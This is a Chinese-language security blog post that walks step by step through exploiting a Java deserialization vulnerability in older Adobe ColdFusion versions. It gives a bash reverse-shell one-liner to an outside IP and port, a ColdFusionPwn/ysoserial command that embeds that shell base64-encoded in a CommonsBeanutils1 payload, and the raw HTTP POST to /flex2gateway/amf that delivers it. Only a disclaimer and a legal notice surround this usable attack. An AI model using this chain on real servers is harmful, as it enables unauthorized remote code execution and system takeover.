#  Adobe ColdFusion 反序列化漏洞   
F_carey  巢安实验室   2024-10-17 23:23  
  
Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。  
  
参考链接：  
- https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html  
  
- https://www.exploit-db.com/exploits/43993  
  
- https://github.com/codewhitesec/ColdFusionPwn  
  
- https://www.cnblogs.com/f-carey/p/15889098.html  
  
## 2.1 漏洞利用过程  
1. 下载利用工具  
  
codewhitesec/ColdFusionPwn (github.com)  
  
ysoserial-master-SNAPSHOT  
  
1. 生成 EXP 文件，Windows 下生成会提示错误: 找不到或无法加载主类 com.codewhitesec.coldfusionpwn.ColdFusionPwner。在Kali成功生成。  
# 使用的反弹命令：/bin/bash -i >& /dev/tcp/192.168.210.10/2333 0>&1java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-d367e379d9-1.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjEwLjEwLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}' getshell.ser  
在线生成反弹Shell：java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)  
  
1. 由于编码问题，如果直接从Notepad里面打开getshell.ser 文件内容，复制粘贴为body部分发送，即使返回的状态码是200，也是不成功的。正确发送方式为：右击选择Paste From File，上传poc.cer文件， 将 EXP 作为数据包body发送给http://your_ip:8500/flex2gateway/amf，Content-Type为application/x-amf：  
POST /flex2gateway/amf HTTP/1.1Host: your_ip:8500Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0Connection: closeContent-Type: application/x-amfContent-Length: 2853[EXP]  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXIicKlL5eSO5bWCtQXfPqLfZ6XdT9ia4XTets5c7ZkTf1AegNuYqExOicA/640?wx_fmt=png&from=appmsg "")  
  
1. 经测试 burpsuite_pro_v2.1.07 可以正常发送，高版本的 BP 无法发送，记得修改host  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXS4kzS5mGiaxWyjfOQRXPc0NCvibPlibOAbm53x2pTbGZnOxdyRhMCkPbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXsxgIfofVpfhEmGoY0fdo5xoT0pBjhNUtKj8LqOS6aykuIwpIUoxlag/640?wx_fmt=png&from=appmsg "")  
  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
